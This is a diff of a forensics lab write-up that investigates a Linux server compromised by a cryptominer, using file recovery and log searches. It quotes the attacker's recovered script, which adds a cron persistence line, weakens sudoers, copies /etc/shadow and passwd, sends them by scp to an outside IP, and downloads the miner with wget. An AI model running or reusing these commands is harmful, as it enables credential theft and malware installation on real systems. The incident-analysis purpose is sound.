@@ -5,7 +5,7 @@ During routine security audits at a startup, the SOC team detected unusual activ
 You received a disk image from one of the affected servers for forensic analysis. Your objective is to determine if a compromise has occurred, identify any tactics or tools used by a potential attacker, assess the scope and impact of the incident, and recommend mitigation strategies to safeguard against future breaches.
 
 - **Category**: Endpoint Forensics
-- **Tools**: Linux CLI, VirusTotal
+- **Tools**: losetup, VirusTotal, Photorec
 
 ## Overview
 
@@ -87,7 +87,7 @@ $ sudo su
 0 * * * * /tmp/backup.elf >/dev/null 2>&1 
 ```
 
-The command will quitely run the suspicious file `backup.elf` every hour. But I need to verify this file is malicious or not. So I need the hash of this file.
+The command will quitely run the suspicious file `backup.elf` every hour. This is so suspicious, but I need to verify this file is malicious or not. So I need the hash of this file.
 ```cmd
 /mnt/xmrig/tmp$ md5sum backup.elf 
 d25208063842ebf39e092d55e033f9e2  backup.elf
@@ -105,7 +105,7 @@ So the file definitely the malicious. And for answering question 5, I go to Deta
 
 There are 2 names but only the `xmr_linux_amd64 (3)` match the format.
 
-For question 6,  I need to recover these file. To do that, I use `Photorec` tool.
+For question 6, to know exact file path on the attacker's server where the malicious miner was hosted, I need to recover these file. To do that, I use `Photorec` tool.
 ```cmd
 $ mkdir /home/ubuntu/recovery
 
@@ -133,7 +133,7 @@ $ strings recovery/recup_dir.21/f4628416.elf | grep -C 10 "tmp/backup.elf"
 // Scheduled tasks that run backup.elf file every hour
 0 * * * * /tmp/backup.elf >/dev/null 2>&1
 
-//
+// Turn off tty-tickets feature of sudo
 echo 'Defaults !tty_tickets' >> /etc/sudoers
 
 cat /etc/sudoers > /tmp/sudoers.txt
@@ -141,13 +141,13 @@ cat /etc/passwd > /tmp/passwd.txt
 cat /etc/shadow > /tmp/shadow.txt
 cat /etc/ssh/ssh_config > /tmp/sshconfig.txt
 
-// 
+// Copy file to attacker server
 scp /tmp/passwd.txt ubuntu@3.28.195.43:/home/ubuntu/passwd.txt
 scp /tmp/sudoers.txt ubuntu@3.28.195.43:/home/ubuntu/sudoers.txt
 scp /tmp/shadow.txt ubuntu@3.28.195.43:/home/ubuntu/shadow.txt
 scp /tmp/sshconfig.txt ubuntu@3.28.195.43:/home/ubuntu/sshconfig.txt
 
-//
+// Download malware
 wget http://3.28.239.653.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
 wget http://3.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
 chmod +x /tmp/backup.elf
@@ -166,7 +166,7 @@ exit
 
 So the attacker download the malicious from path `Tools/backup/backup.elf` of  server `3.28.195.43`.
 
-According to the scenario of the question 9, I need to find the successfull login logs into the victim. To do that, I neec `auth.log` file.
+According to the scenario of the question 9, to find the IP address of the machine the attacker used to perform lateral movement to this Linux box, I need to find the successfull login logs into the victim. To do that, I neec `auth.log` file.
 ```cmd
 $ grep -r "auth.log" recovery/
 grep: recovery/recup_dir.82/f16631240.gz: binary file matches
@@ -199,7 +199,7 @@ Oct 28 15:49:57 inuxserver sshd[2589]: Accepted password for ubuntu from 192.168
 
 There is only sucessfull login from IP `192.168.19.158`, so this definitely a malicious. 
 
-To detect brute-force attemps for answering question 10, I search with term `Failed password` as failed login in the link above.
+To detect brute-force attemps to know the first username that the attacker targeted in question 10, I search with term `Failed password` as failed login in the link above.
 ```cmd
 $ grep -r "Failed password" recovery/
 grep: recovery/recup_dir.21/f4628416.elf: binary file matches
